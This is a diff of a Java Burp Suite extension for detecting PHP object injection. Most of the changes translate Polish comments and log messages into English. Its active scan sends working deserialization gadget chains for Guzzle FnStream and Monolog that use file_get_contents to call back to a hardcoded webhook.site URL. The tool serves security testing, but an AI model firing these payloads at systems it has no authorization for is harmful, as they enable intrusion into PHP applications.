@@ -26,13 +26,13 @@ import java.util.regex.Pattern;
 
 public class PhpObjectInjectionScanner implements BurpExtension {
 
-    // Twój zaktualizowany token z webhook.site (UUID)
+    // Your updated webhook.site token (UUID)
     private static final String WEBHOOK_TOKEN = "441ad22b-9923-4cff-a2e0-6313d9bf7c54";
 
     private MontoyaApi api;
     private ScheduledExecutorService scheduler;
     private int lastWebhookInteractionCount = 0;
-    private boolean isFirstPoll = true; // Flaga zapobiegająca fałszywym alarmom przy starcie
+    private boolean isFirstPoll = true; // Flag to prevent false alarms on startup
 
     @Override
     public void initialize(MontoyaApi api) {
@@ -51,7 +51,7 @@ public class PhpObjectInjectionScanner implements BurpExtension {
             }
         });
 
-        api.logging().logToOutput("Wtyczka PHP Object Injection Scanner załadowana (Tryb Community Edition).");
+        api.logging().logToOutput("PHP Object Injection Scanner extension loaded (Community Edition Mode).");
     }
 
     private void pollWebhookInteractions() {
@@ -67,26 +67,26 @@ public class PhpObjectInjectionScanner implements BurpExtension {
             if (matcher.find()) {
                 int currentTotal = Integer.parseInt(matcher.group(1));
 
-                // Przy pierwszym uruchomieniu tylko zapisujemy aktualny stan, żeby nie raportować starych zapytań
+                // On the first run, we only save the current state to avoid reporting old requests
                 if (isFirstPoll) {
                     lastWebhookInteractionCount = currentTotal;
                     isFirstPoll = false;
                     return;
                 }
 
-                // Jeśli po inicjalizacji liczba zapytań wzrosła, podnosimy alarm!
+                // If the number of requests increased after initialization, trigger the alarm!
                 if (currentTotal > lastWebhookInteractionCount) {
                     int newInteractions = currentTotal - lastWebhookInteractionCount;
-                    api.logging().logToOutput("[!!!] KRYTYCZNE: Wykryto nową interakcję OOB (HTTP)! Zarejestrowano " + newInteractions + " nowych wywołań w Webhook.site.");
+                    api.logging().logToOutput("[!!!] CRITICAL: New OOB interaction (HTTP) detected! Registered " + newInteractions + " new requests on Webhook.site.");
                     lastWebhookInteractionCount = currentTotal;
                 }
             }
         } catch (Exception e) {
-            api.logging().logToError("Błąd podczas łączenia z API webhook.site: " + e.getMessage());
+            api.logging().logToError("Error connecting to webhook.site API: " + e.getMessage());
         }
     }
 
-    // --- SKANOWANIE PASYWNE ---
+    // --- PASSIVE SCANNING ---
     private static class PoiPassiveProxyHandler implements ProxyRequestHandler {
         private final MontoyaApi api;
         private final Pattern POI_PATTERN = Pattern.compile("(O:[0-9]+:\"[^\"]+\":[0-9]+:\\{|a:[0-9]+:\\{)");
@@ -118,7 +118,7 @@ public class PhpObjectInjectionScanner implements BurpExtension {
                 }
 
                 if (found) {
-                    String msg = "[PASYWNE] Znaleziono potencjalny zserializowany obiekt PHP w parametrze: " + parameter.name() + " (URL: " + interceptedRequest.url() + ")";
+                    String msg = "[PASSIVE] Potential serialized PHP object found in parameter: " + parameter.name() + " (URL: " + interceptedRequest.url() + ")";
                     api.logging().logToOutput(msg);
                 }
             });
@@ -136,7 +136,7 @@ public class PhpObjectInjectionScanner implements BurpExtension {
         }
     }
 
-    // --- SKANOWANIE AKTYWNE ---
+    // --- ACTIVE SCANNING ---
     private class PoiActiveContextMenuProvider implements ContextMenuItemsProvider {
         private final MontoyaApi api;
         private final String webhookToken;
@@ -152,7 +152,7 @@ public class PhpObjectInjectionScanner implements BurpExtension {
             List<Component> menuItems = new ArrayList<>();
 
             if (event.messageEditorRequestResponse().isPresent() || !event.selectedRequestResponses().isEmpty()) {
-                JMenuItem scanItem = new JMenuItem("Skanuj podatność POI (Aktywnie)");
+                JMenuItem scanItem = new JMenuItem("Scan for POI vulnerability (Active)");
                 scanItem.addActionListener(e -> {
                     List<HttpRequestResponse> targets = new ArrayList<>(event.selectedRequestResponses());
                     if (targets.isEmpty() && event.messageEditorRequestResponse().isPresent()) {
@@ -167,27 +167,28 @@ public class PhpObjectInjectionScanner implements BurpExtension {
         }
 
         private void performActiveScan(List<HttpRequestResponse> targets) {
-            api.logging().logToOutput("[AKTYWNE] Rozpoczęto aktywne skanowanie " + targets.size() + " żądań...");
+            api.logging().logToOutput("[ACTIVE] Started active scanning of " + targets.size() + " requests...");
 
             for (HttpRequestResponse baseRequestResponse : targets) {
                 HttpRequest baseRequest = baseRequestResponse.request();
 
                 for (ParsedHttpParameter param : baseRequest.parameters()) {
-                    api.logging().logToOutput("Testowanie parametru: " + param.name() + " w URL: " + baseRequest.url());
+                    api.logging().logToOutput("Testing parameter: " + param.name() + " in URL: " + baseRequest.url());
 
-                    // 1. Detekcja błędów
+                    // 1. Error detection
                     String errorPayload = "O:999999:\"NonExistentClassForErrorTrigger\":0:{}";
                     sendAndCheckPayload(baseRequest, param, errorPayload, true);
 
                     // 2. Fuzzing
-                    // Zamiast systemowego 'curl', używamy funkcji 'file_get_contents' wbudowanej w PHP.
-                    // Rozwiązuje to problem z Windowsem, na którym 'curl' często nie jest dostępny dla PHP.
+                    // Instead of system 'curl', we use PHP's built-in 'file_get_contents' function.
+                    // This solves the issue on Windows, where 'curl' is often unavailable to PHP.
                     String cmd = "http://webhook.site/" + webhookToken;
                     int cmdLen = cmd.length();
 
-                    // Używamy \u0000, czyli natywnego znaku NULL w Javie, zamiast dosłownego tekstu \x00
+                    // We use the safe S: format (capital S), which allows saving Null Bytes as plain text \00.
+                    // This protects against packet rejection (Malformed Request) by the built-in PHP server.
                     String[] gadgetChains = {
-                            // Guzzle z file_get_contents oraz poprawnymi znakami NULL
+                            // Guzzle
                             "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{S:33:\"\\00GuzzleHttp\\5CPsr7\\5CFnStream\\00methods\";a:1:{s:5:\"close\";s:17:\"file_get_contents\";}s:9:\"_fn_close\";s:" + cmdLen + ":\"" + cmd + "\";}",
                             // Monolog
                             "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{S:9:\"\\00*\\00socket\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{S:10:\"\\00*\\00handler\";r:2;S:9:\"\\00*\\00buffer\";a:1:{i:0;a:2:{i:0;s:" + cmdLen + ":\"" + cmd + "\";s:5:\"level\";N;}}S:13:\"\\00*\\00bufferSize\";i:-1;S:14:\"\\00*\\00initialized\";b:1;S:14:\"\\00*\\00bufferLimit\";i:-1;S:18:\"\\00*\\00flushOnOverflow\";b:0;S:8:\"\\00*\\00level\";N;}}"
@@ -199,7 +200,7 @@ public class PhpObjectInjectionScanner implements BurpExtension {
 
                 }
             }
-            api.logging().logToOutput("[AKTYWNE] Zakończono wysyłanie payloadów.");
+            api.logging().logToOutput("[ACTIVE] Finished sending payloads.");
         }
 
         private void sendAndCheckPayload(HttpRequest baseRequest, ParsedHttpParameter param, String payload, boolean checkError) {
@@ -211,7 +212,7 @@ public class PhpObjectInjectionScanner implements BurpExtension {
             if (checkError) {
                 Matcher errorMatcher = PHP_ERROR_PATTERN.matcher(reqRes.response().bodyToString());
                 if (errorMatcher.find()) {
-                    String msg = "[AKTYWNE] Wykryto błąd unserialize() w parametrze: " + param.name();
+                    String msg = "[ACTIVE] unserialize() error detected in parameter: " + param.name();
                     api.logging().logToOutput(msg);
                 }
             }
